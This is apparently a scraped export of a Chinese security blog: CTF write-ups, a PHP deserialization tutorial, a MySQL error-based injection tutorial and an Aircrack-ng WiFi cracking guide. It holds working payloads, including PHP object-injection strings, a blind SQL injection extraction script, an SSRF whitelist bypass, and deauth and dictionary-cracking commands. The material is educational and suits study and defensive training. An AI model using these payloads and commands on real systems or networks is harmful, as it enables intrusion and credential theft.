$_GET[&#39;exp&#39;];echo &quot;&lt;br&gt;&quot;;unserialize($exp);?&gt; 只需将$score=10000就行, payload: ?exp=O:7:&quot;Student&quot;:1:&#123;s:5:&quot;score&quot;;i:10000;&#125; Syc&#123;F4n-Xu-L4i-Hu4-Ha-Ha-Ha&#125; 又来一只猫dirsearch扫一下发现www.zip文件，发现好像是网站之前的源码 从index.php可以看到 12345 &lt;?phpinclude &#39;class.php&#39;;$select &#x3D; $_GET[&#39;select&#39;];$res&#x3D;unserialize(@$select);?&gt; 从class.php可以看到 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123; private $username &#x3D; &#39;nonono&#39;; private $password &#x3D; &#39;yesyes&#39;; public function __construct($username,$password)&#123; $this-&gt;username &#x3D; $username; $this-&gt;password &#x3D; $password; &#125; function __wakeup()&#123; $this-&gt;username &#x3D; &#39;guest&#39;; &#125; function __destruct()&#123; if ($this-&gt;password !&#x3D; 100) &#123; echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;; die(); &#125; if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 这题就变成了绕过__wakeup方法 payload： ?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; Syc&#123;H31lo_4dmiN_r3al_f14g&#125; 你有初恋吗查看源代码 123456789101112&lt;!--$adore&#x3D;&#39;***************&#39;;$now &#x3D; $_POST[&#39;lover&#39;];setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));if(isset($now)&amp;&amp;$now!&#x3D;syclover) &#123; if($_COOKIE[&#39;Heart&#39;] &#x3D;&#x3D;&#x3D; md5($adore. urldecode($now)))&#123; die ($flag); &#125;else &#123; die(&#39;I do not love you! You are not in my heart!&#39;); &#125; &#125;--&gt; 这里用url二次编码就行 直接用hackbar POST lover=%2573%2579%2563%256c%256f%2576%2565%2572 Syc&#123;D0_Y0u_l0v3_M3???&#125; ﬁnalsql这道题登陆框的注入已经被过滤的干干净净，不过在神秘代码处可以进行异或盲注 空格，*以及所有mysql里可以代替空格的不可显字符，但是没有禁用括号 禁用了or或and与=连用，所以or 1=(payload)形式不好用了，这里可以用异或注入（当然其它运算符都可以），脚本如下 二分法脚本： 上面是抄别人的wp 自己做下： 12search.php?id&#x3D;1search.php?id&#x3D;2-1 两处回显结果一样 说明可能有注入 fuzz一下关键字 在buu注意要修改线程还有延时 长度为890的都过滤了 也不太多 直接异或注入吧 空格过滤使用括号 ord ascii没有过滤 if过滤了 不用也行 可以二分bool盲注 写脚本 12345678910111213141516171819202122232425262728293031323334353637import requestsproxies =&#123; &#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;url=&quot;http://984cd692-e1ae-42fc-aceb-4efd0170059a.node3.buuoj.cn/search.php?id=1&quot;flag=&#x27;&#x27;for i in range(1,1000): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 # payload1=&quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(str(i),str(mid)) # payload2=&quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(str(i),str(mid)) # payload1=&quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(str(i),str(mid)) # payload2=&quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(str(i),str(mid)) payload1=&quot;^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(str(i),str(mid)) payload2=&quot;^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(str(i),str(mid)) try: r1=requests.get(url+payload1) print(i,mid) if &#x27;ERROR！！！&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url+payload2) if &quot;ERROR！！！&quot; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: breakprint(flag)","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://www.moonback.xyz/tags/wp/"},{"name":"SYC","slug":"SYC","permalink":"http://www.moonback.xyz/tags/SYC/"}]},{"title":"Aircrack-ng学习使用","slug":"aircrack-wifi","date":"2019-11-02T06:53:40.000Z","updated":"2020-04-28T07:32:23.050Z","comments":true,"path":"2019/11/02/aircrack-wifi/","link":"","permalink":"http://www.moonback.xyz/2019/11/02/aircrack-wifi/","excerpt":"本篇博客主要介绍了Aircrack-ng的使用，以及用此工具破解wifi的教程！","text":"本篇博客主要介绍了Aircrack-ng的使用，以及用此工具破解wifi的教程！ Aircrack-ng是什么？Aircrack-ng是一个与802.11标准的无线网络分析有关的安全套件。 主要功能：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。 Aircrack-ng可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探802.11a，802.11b，802.11g的数据 aircrack-ng 套件包含有： 实战破解wifi分为五个阶段： 准备 探测 抓包 攻击 破解 准备硬件方面： 无线网卡 kali虚拟机（或者装有Aircrack-ng套件的windows) 准备一个强大的字典 探测开始时一定要保证它现在没有连接到任何wifi 下面那个wlan0里面没有ip地址什么的就说明现在不在连接中 启用无线网卡至monitor即监听模式 airmon-ng start wlan0 如果再次使用ifconfig可以发现，我们的网卡已经被重命名为wlan0mon 获取当前网络概况： airodump-ng wlan0mon 抓包 探测无线网络，抓取无线数据包 airodump-ng --bssid 目标mac地址 -c 11 -w longas wlan0mon 参数解释： –bssid -c设置目标AP的工作频道 -w后面紧跟要保存的文件的文件名，注意：生成的文件名是longas-01.cap wlan0mon：为之前已经开启监听的网卡名 按Enter开始执行，不要关闭并打开另一个shell进行下一步 攻击这里为了获得破解所需的WPA2握手验证的整个完整数据包，我们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，我们也就有机会捕获到包含WPA2握手验证的完整数据包了。此处需要新开一个shell： aireplay-ng -0 1 –a 路由器mac -c 客户端mac wlan0mon 参数解释： -0 采用deauth攻击模式，后面跟上攻击次数，这里我设置为1，大家可以根据实际情况设置为10不等 -a 后跟路由器的mac地址 -c 后跟客户端的mac地址，不指定的话会攻击所有的已连接的客户端，下图中STATION一栏代表的就是已连接的客户端 然后回到抓取数据包的界面。在右上角出现handshake的提示证明获得了包含WPA-PSK密码的握手数据报文。如未出现，请再次执行上述步骤 破解aircrack-ng -w dict.txt 捕获的.cap文件 由于我这个密码设置的简单，回车立马出来了 参考： https://www.jianshu.com/p/fd16236057dfhttps://chujian521.github.io/blog/2018/08/23/使用Aircrack-ng进行WiFi密码破解/","categories":[],"tags":[{"name":"Aircrack-ng","slug":"Aircrack-ng","permalink":"http://www.moonback.xyz/tags/Aircrack-ng/"},{"name":"wifi破解","slug":"wifi破解","permalink":"http://www.moonback.xyz/tags/wifi%E7%A0%B4%E8%A7%A3/"},{"name":"kali","slug":"kali","permalink":"http://www.moonback.xyz/tags/kali/"}]},{"title":"php序列化和反序列化","slug":"php-serialize","date":"2019-10-27T11:57:01.000Z","updated":"2020-02-01T07:14:54.631Z","comments":true,"path":"2019/10/27/php-serialize/","link":"","permalink":"http://www.moonback.xyz/2019/10/27/php-serialize/","excerpt":"本篇博客介绍了php序列化和反序列化的相关知识！","text":"本篇博客介绍了php序列化和反序列化的相关知识！ 相关概念什么是序列化和反序列化？ **序列化:**把复杂的数据类型压缩到一个字符串中，数据类型可以是数组，字符串，对象等 **反序列化:**恢复原先被序列化的变量 相关函数serialize() //将一个对象转换成一个字符串 unserialize() //将字符串还原成一个对象 序列化例如下面一段代码 123456789101112&lt;?php class test &#123; private $flag &#x3D; &quot;flag&#123;233&#125;&quot;; public $a &#x3D; &quot;aaa&quot;; static $b &#x3D; &quot;bbb&quot;; &#125; $test &#x3D; new test; $data &#x3D; serialize($test); echo $data; ?&gt; 看一下运行结果 O:4:&quot;test&quot;:2:&#123;s:10:&quot; test flag&quot;;s:9:&quot;flag&#123;233&#125;&quot;;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125; 序列化的结果满足： O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125; 这里说明一下序列化字符串的含义： O:4:&quot;test&quot;指Object(对象) 4个字符:test :2对象属性个数为2 &#123;&#125;中为属性字符数：属性值 注意：可以看到testflag的长度为8，序列化中却显示长度为10。这是因为它是private属性，翻阅文档就可以看到说明，它会在两侧加入空字节 \\x00 + 类名 + \\x00 + 变量名 反序列化出来的是private变量, \\x00 + * + \\x00 + 变量名 反序列化出来的是protected变量 直接变量名反序列化出来的是public变量 反序列化下面一段代码 1234567&lt;?php $str &#x3D; &#39;O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D&#39;; $data &#x3D; urldecode($str); $obj &#x3D; unserialize($data); var_dump($obj); ?&gt; 魔术方法PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods) 比较重要的几个函数： __sleep() serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 __wakeup() unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 __toString() __toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 __destruct() 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 __construct() 造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。 魔术方法执行流程举个例子： 1234567891011121314151617181920212223242526272829&lt;?phpclass Test&#123; public function __construct()&#123; echo &#x27;construct run&#x27;; &#125; public function __destruct()&#123; echo &#x27;destruct run&#x27;; &#125; public function __toString()&#123; echo &#x27;toString run&#x27;; &#125; public function __sleep()&#123; echo &#x27;sleep run&#x27;; &#125; public function __wakeup()&#123; echo &#x27;wakeup run&#x27;; &#125;&#125;$test= new Test();$sTest= serialize($test);$usTest= unserialize($sTest);$string= &#x27;hello class &#x27; . $test;?&gt; 分析一下执行过程： new了一个对象，对象被创建，执行__construct方法 serialize了一个对象，对象被序列化，先执行__sleep方法，再序列化 unserialize了一个序列化字符串，对象被反序列化，先反序列化，再执行__wakeup方法 把Test这个对象当做字符串使用了，执行__toString方法 程序运行完毕，对象自动销毁，执行__destruct方法 漏洞利用CVE-2016-7124这个漏洞主要是用于绕过__wakeup()方法的 利用方式： 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 例如： 构造序列化对象： O:5:&quot;SoFun&quot;:1:&#123;S:7:&quot;\\00*\\00file&quot;;s:8:&quot;flag.php&quot;;&#125; 绕过__wakeup： O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:8:&quot;flag.php&quot;;&#125; 这个\\00在url传输时使用%00的 session反序列化漏洞简介PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化 在php.ini中有以下关于session配置项(通过phpinfo)： 有几个重要的配置： session.save_path 设置session的存储路径 session.save_handler 设定用户自定义存储函数 session.auto_start 指定会话模块是否在请求开始时启动一个会话 session.serialize_handler 定义用来序列化/反序列化的处理器名字。默认使用php除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同: php_binary： 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php： 键名＋竖线＋经过serialize()函数反序列处理的值 php_serialize： serialize()函数反序列处理数组方式 存储机制php中的session内容是以文件方式来存储的，由session.save_handler来决定。文件名由sess_+sessionid命名，文件内容则为session序列化后的值。 而这个sessionid是可以在浏览器里查出来的 来测试一个demo 123456&lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); session_start(); $_SESSION[&#39;name&#39;] &#x3D; &#39;twosmi1e&#39;;?&gt; 运行后在配置文件设定的路径中会生成一个session文件，其内容为 a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;twosmi1e&quot;;&#125; 改变session.save_handler发现： 随着存储引擎变化，其内容的格式也会变化 利用方式通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据： $_SESSION[&#39;ryat&#39;] = &#39;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#39;; 例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下： a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; 在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成： // var_dump($_SESSION); array(1) &#123; [&quot;a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;&quot;]=&gt; object(stdClass)#1 (0) &#123; &#125; &#125; 可以看到，通过注入 | 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象 那么就存在两种情况： 当 session.auto_start＝Off 时 当配置选项 session.auto_start＝Off，存在两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码： 123456789101112131415161718192021222324&#x2F;&#x2F;foo1.phpini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);session_start();$_SESSION[&#39;ryat&#39;] &#x3D; $_GET[&#39;ryat&#39;];&#x2F;&#x2F;foo2.phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);&#x2F;&#x2F;or session.serialize_handler set to php in php.ini session_start();class ryat &#123; var $hi; function __wakeup() &#123; echo &#39;hi&#39;; &#125; function __destruct() &#123; echo $this-&gt;hi; &#125;&#125; 当访问 foo1.php 时，提交数据如下： foo1.php?ryat=|O:4:&quot;ryat&quot;:1:&#123;s:2:&quot;hi&quot;;s:4:&quot;ryat&quot;;&#125; 脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 __wakeup 方法和 __destruct 方法 当 session.auto_start＝On 时 当配置选项 session.auto_start＝On，会自动注册 Session 会 话，因为该过程是发生在脚本代码执行前，所以在脚本中设定 的包括序列化处理器在内的 session 相关配选项的设置是不起 作用的，因此一些需要在脚本中设置序列化处理器配置的程序 会在 session.auto_start＝On 时，销毁自动生成的 Session 会 话，然后设置需要的序列化处理器，再调用 session_start() 函 数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中 设置的不同，就会出现安全问题,如下面的代码： 12345678910&#x2F;&#x2F;foo.phpif (ini_get(&#39;session.auto_start&#39;)) &#123; session_destroy();&#125;ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);session_start();$_SESSION[&#39;ryat&#39;] &#x3D; $_GET[&#39;ryat&#39;]; 当第一次访问该脚本，并提交数据如下： foo.php?ryat=|O:8:&quot;stdClass&quot;:0:&#123;&#125; 脚本会按照 php_serialize 处理器的序列化格式存储数据： a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; 当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：） 这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。 Jarvisoj上的一道题具体参考：http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"反序列化","slug":"反序列化","permalink":"http://www.moonback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"hackgame2019部分题目writeup","slug":"hackgame-wp","date":"2019-10-26T15:08:20.000Z","updated":"2020-01-16T10:05:26.106Z","comments":true,"path":"2019/10/26/hackgame-wp/","link":"","permalink":"http://www.moonback.xyz/2019/10/26/hackgame-wp/","excerpt":"本篇博客主要介绍了hackgame2019部分题目的writeup!","text":"本篇博客主要介绍了hackgame2019部分题目的writeup! 白与夜将图片down下来，用Stegsolve打开 信息安全 2077抓到post包，将If-Unmodified-Since改成2077之后 宇宙终极问题42Google一下就知道了 12Give me 3 integers, x, y, and z, such thatx^3 + y^3 + z^3 &#x3D; 42 42 = (-80538738812075974)³ + 80435758145817515³ + 12602123297335631³ Everything还是Google一下就出来了 12Since you already know the Answer to Everything, could you give me 8 integers, a, b, c, d, i, j, k and l, such thata^3 + b^3 + c^3 + d^3 &#x3D; i^2 + j^2 + k^2 + l^2 &#x3D; random_prime(2^256) * random_prime(2^256) &#x3D; 2696202144446753329066703065018205556554521178594549469403210892619232428137856502450273212093761946616284001286324448308517304228289606401398114121525169 两个求解页面：四平方 四立方 Last question12The last question is beyond Everything, but still you can try to solve it, by giving me 2 integers, p and q, such thatp^2 + q^2 &#x3D; randint(2^256) &#x3D; 16803108896636432087843597567919881272571173380668774706039248650282590651651 这道题就可以多试几次，不可能所有的随机数都可以被分成4个数的平方之和，有的只能分成两个 网页读取器12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from flask import Flask, render_template, request, send_from_directoryimport requests # well, requests is designed for humans, and I like it.app &#x3D; Flask(__name__)whitelist_hostname &#x3D; [&quot;example.com&quot;, &quot;www.example.com&quot;]whitelist_scheme &#x3D; [&quot;http:&#x2F;&#x2F;&quot;]def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url &#x3D; url[len(i):] # strip scheme url &#x3D; url[url.find(&quot;@&quot;) + 1:] # strip userinfo## 截取要@后面的 if not url.find(&quot;&#x2F;&quot;) &#x3D;&#x3D; -1: url &#x3D; url[:url.find(&quot;&#x2F;&quot;)] # strip parts after authority## 截取要&#x2F;前的 if not url.find(&quot;:&quot;) &#x3D;&#x3D; -1: url &#x3D; url[:url.find(&quot;:&quot;)] # strip port 要:前的 if url not in whitelist_hostname: return (False, &quot;hostname &#123;&#125; not in whitelist&quot;.format(url)) return (True, &quot;ok&quot;) return (False, &quot;scheme not in whitelist, only &#123;&#125; allowed&quot;.format(whitelist_scheme))@app.route(&quot;&#x2F;&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;&#x2F;request&quot;)def req_route(): url &#x3D; request.args.get(&#39;url&#39;) status, msg &#x3D; check_hostname(url) if status is False: # print(msg) return msg try: r &#x3D; requests.get(url, timeout&#x3D;2) if not r.status_code &#x3D;&#x3D; 200: return &quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns &#123;&#125;.&quot;.format(r.status_code) return r.text except requests.Timeout: return &quot;We tried our best, but it just timeout.&quot; except requests.RequestException: return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;@app.route(&quot;&#x2F;source&quot;)def get_source(): return send_from_directory(&quot;&#x2F;static&#x2F;&quot;, &quot;app.py&quot;, as_attachment&#x3D;True)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(&quot;0.0.0.0&quot;, 8000, debug&#x3D;False) 这道题主要的点就是 URL 的 parser 和 requester 的不一致性导致的意料之外的 SSRF 问题 关于URI(统一资源标志符)URL（统一资源定位符）是 URI 最常见的一种形式，而 URL 就是我们常说的「网址」 URI 的语法大概长成下面这个样子： scheme:[//authority]path[?query][#fragment] 其中用 [] 围住的是可选的。然后我们来看一下各部分： 协议 (scheme)：访问资源使用的协议，比如说 http, https 之类的。 来源 (authority)：来源中包含了主机名，和可选的用户信息和端口号，比如 www.ustc.edu.cn, admin:admin@www.example.com:2333（使用用户名为 admin，密码为 admin，访问 www.example.com 的 2333 端口获取资源）。 路径 (path)：比如说 /cgi-bin, /a/b/c/d/e/f/g 等，有等级 (hierarchical) 关系。 查询 (query)：没有等级 (non-hierarchical) 关系的数据。一般来说，查询中的参数会被网站的后端获取到，然后进行对应的处理，比如 ?q=keyword，?a=1&amp;b=2。 片段 (fragment)：指向一个更低级别的资源，例如 #Examples，浏览器访问时会滚动到 id 为 Examples 的标签。如果写过单页面应用 (SPA) 的同学可能会知道，一些框架处理路由时使用 hash 模式，这里的 hash 就是片段开头的 #解题方法 如果我们构造一个奇怪的 URL 会怎么样？如果我们能想办法让 check_hostname 解释出主机名为 example.com 的同时，让 requests.get() 实际访问我们想要的地址，那就成功了。 预期解就使用到了 fragment（当然用 ? 也是可以的）。现有的 requester 都会直接忽略掉 # 后面的东西，毕竟这对请求网站内容是没有意义的。但这里的代码没有对 # 进行任何处理，而且会粗暴地忽略掉 @ 前面的所有内容 当时做这道题一直想的是下面这个思路，试了好久才成功 http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的 所以这道题的payload: http://web1/flag#@example.com 或 http://web1/flag?@example.com 达拉崩吧大冒险这题我第一时间想到的可能是注入相关的东西，因此抓包改包，最后也没做出来 一个简单的整数溢出漏洞观察到 WebSocket 的 JavaScript 代码中，向服务器通信的代码如下： 1234567$(&quot;#send&quot;).click( function () &#123; let v &#x3D; $(&quot;#input option:selected&quot;).val(); addMsg(&quot;我&quot;, opts[parseInt(v)]); ws.send(v) &#125;); 在“料理大市场”买鸡的时候，bp抓包当 v = -1900000000000000000 时候，则会发生大整数溢出，并使得自己的攻击力溢出，而后挑战恶龙即可。 这个是真的想不到，所以说以后做题还要放开思维 Happy LUG直接用Chrome或Firefox访问 😂.hack.ustclug.org 会自动转成 xn--g28h.hack.ustclug.org 这里是 Unicode的一个域名编码方案 Punycode，😂会被编码成 xn--g28h 另一个考点就是 DNS 记录。一个域名除了可以指向一个或多个 IP 地址（A 或 AAAA 记录）之外还可以包含其他信息，例如指向另一个域名（CNAME 记录），指示接收邮件的服务器（MX 记录），或者提供任意字符串（TXT 记录）等等 本道题就用了域名指向字符串这一点，可以使用nslookup或者dig dig TXT xn--g28h.hack.ustclug.org +noidnout nslookup -q=txt xn--g28h.hack.ustclug.org 正则验证器这题考察的是正则回溯的知识点 可参见wiki 这里有个测试正则的平台 这里说下正则表达式*?+的用法 + 号代表前面的字符必须至少出现一次（1次或多次） * 号代表字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次） ? 问号代表前面的字符最多只可以出现一次（0次、或1次） 可以直接利用 Regex: (a*)*$ String: aaaaaaaaaaaaaaaaaaaaaaab 这个正则由于失败时回溯的存在，每增加一个 a 就会使匹配时间翻一倍 三教奇妙夜这题考察的是视频提取不同的帧的操作 OpenCV 是一个计算机视觉库。我们这里使用 OpenCV 的 Python 接口。其实只需要知道这么几个 API 就可以了： file = cv2.VideoCapture(filename): 打开一个视频文件。 file.read() -&gt; ret, frame: 读取这个视频文件的一帧，返回状态与对应的帧。 cv2.absdiff(frame1, frame2): 比较两个帧，返回一个 Array。 array.sum(): 求 Array 的和。此外为了显示图片，可以使用 matplotlib，from matplotlib import pyplot as plt 然后 plt.imshow(frame) 和 plt.show() 就行。完整的代码如下:12345678910111213141516import cv2from matplotlib import pyplot as pltfile &#x3D; cv2.VideoCapture(&quot;output-1.mp4&quot;)ret, preframe &#x3D; file.read()while True: ret, frame &#x3D; file.read() if ret &#x3D;&#x3D; 0: break diff &#x3D; cv2.absdiff(preframe, frame).sum() if diff &gt; 10000: print(&quot;diff: &#123;&#125;&quot;.format(diff)) plt.imshow(frame) plt.show() preframe &#x3D; frame","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"hackgame","slug":"hackgame","permalink":"http://www.moonback.xyz/tags/hackgame/"}]},{"title":"Mysql报错注入学习","slug":"mysql-wrong-injection","date":"2019-10-25T11:49:46.000Z","updated":"2020-04-28T07:29:36.667Z","comments":true,"path":"2019/10/25/mysql-wrong-injection/","link":"","permalink":"http://www.moonback.xyz/2019/10/25/mysql-wrong-injection/","excerpt":"本篇博客主要介绍了sql注入中的报错注入！","text":"本篇博客主要介绍了sql注入中的报错注入！ 什么是报错注入?SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。 这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。 主要分为下面几类： BigINT数据类型溢出 Xpath语法错误 concat+rand()+group_by()导致主键重复 空间数据类型函数错误 BigINT数据类型溢出这里可以看到mysql是怎么处理整形的 在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况： 我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的： 同理，利用exp函数也会产生类似的溢出错误 注入姿势： select exp(~(select*from(select ****)x)); 利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果： 而在mysql&gt;5.5.53时，则不能返回查询结果 此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到： 123&#x2F;* Max length of a error message. Should bekept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;#define ERRMSGSIZE (512) xpath语法错误从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml。 extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容: 它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里： 主键重复这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的： select count(*) from test group by concat(version(),floor(rand(0)*2)); rand()函数：返回一个 0 到 1 之间的浮点数，如果给定了整数常量 N，即 rand(N)，N 将会被用作种子值，并产生可重复的值的序列 **floor函数:**返回小于等于该值的最大整数 *COUNT()函数:**返回匹配指定条件的行数,COUNT() 函数返回表中的记录数 报错需要count(*)，rand()、group by，三者缺一不可 mysql的官方文档中对 rand() 函数有特殊的说明： 官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。 因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于Duplicate entry &#39;…&#39; for key &#39;group_key&#39;的错误。 另外，经过测试 rand()会随机报错，就是有可能报错，有的时候不会， rand(0)肯定会报错，rand(1)则一定不会报错。 所以要让他报错的话直接用rand(0) 原理请参见：http://heartsky.info/2016/12/04/几种常见的%20MySQL%20报错注入/ 以sqli-labs中的Less-5为例 爆数据库 ?id=1&#39; union select count(*),2,3 from users group by concat(database(),floor(rand(0)*2))%23 爆表和字段 ?id=1&#39; union select count(*),2,3 from information_schema.tables group by concat((select concat(table_schema,&#39;:&#39;,table_name) from information_schema.tables limit 1,1),floor(rand(0)*2))%23 一些特性列名重复mysql列名重复会报错，我们利用name_const来制造一个列： 根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。 利用这个特性加上join函数(知道表名)可以爆列名： 这样累加的方式就可以爆出所有的字段 几何函数mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行： 1234565.5.47mysql&gt; select multipoint((select * from (select * from (select version())a)b));ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;b&#96;.&#96;version()&#96; from ((select &#39;5.5.47&#39; AS &#96;version()&#96; from dual) &#96;b&#96;))&#39; value found during parsing5.7.17mysql&gt; select multipoint((select * from (select * from (select version())a)b));ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;a&#96;.&#96;version()&#96; from ((select version() AS &#96;version()&#96;) &#96;a&#96;))&#39; value found during parsing 